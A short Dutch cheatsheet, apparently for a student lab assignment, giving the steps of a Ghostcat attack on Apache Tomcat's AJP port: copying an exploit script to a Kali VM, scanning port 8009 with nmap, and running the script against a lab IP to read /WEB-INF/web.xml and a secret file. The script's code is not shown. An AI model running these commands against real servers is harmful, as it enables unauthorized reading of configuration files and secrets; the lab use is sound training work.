# 🗒️ Cheatsheat

Volg de stappen hieronder om de aanval succesvol uit te voeren

## Host

Open een terminal vanaf de host om het bestand over te zetten naar de kali vm

```bash
scp -P 2222  "C:/Users/<Gebruikersnaam>/<Het pad waar je de folder hebt opgeslagen>/cyber-npe-opdracht/scripts/python/exploit_ghostcat.py" osboxes@localhost:~/Desktop
```

## Kali

Open een terminal in de ubuntu vm en voer volgende commando's uit

```bash
su -
cd /home/osboxes/Desktop
chmod +x exploit_ghostcat.py
nmap 10.10.10.4 -p 8009
python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/web.xml read
python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/secret.txt read
```
